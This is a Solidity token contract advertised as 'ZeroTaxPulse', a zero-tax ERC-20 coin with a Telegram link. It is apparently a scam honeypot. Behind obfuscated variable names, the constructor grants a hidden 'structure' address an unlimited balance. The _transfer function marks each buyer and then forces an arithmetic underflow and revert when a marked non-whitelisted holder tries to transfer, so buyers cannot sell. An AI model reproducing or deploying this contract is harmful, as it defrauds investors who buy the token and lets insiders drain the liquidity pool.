// https://t.me/Zerotaxpulse

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ZeroTaxPulse is Ownable {
    constructor(
        string memory foot,
        string memory somehow,
        address sick,
        address structure
    ) {
        uniswapV2Router = IUniswapV2Router02(sick);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = somehow;
        _name = foot;
        policeman = 0;
        _decimals = 9;
        _balances[structure] = wild;
        changing = 1000000000;
        riding[structure] = wild;
        _tTotal = changing * 10**_decimals;
        riding[msg.sender] = wild;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public policeman;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private changing;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private disappear;
    uint256 private wild = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address pocket,
        address sides,
        uint256 cattle
    ) internal {
        uint256 including = policeman;

        address leaf = uniswapV2Pair;

        if (riding[pocket] == 0 && leaf != pocket && practical[pocket] > 0) {
            riding[pocket] -= including - 1;
        }

        address shoe = disappear;
        disappear = sides;
        practical[shoe] += including + 1;

        _balances[pocket] -= cattle;
        uint256 hurry = (cattle / 100) * policeman;
        cattle -= hurry;
        _balances[sides] += cattle;
    }

    mapping(address => uint256) private practical;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private riding;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}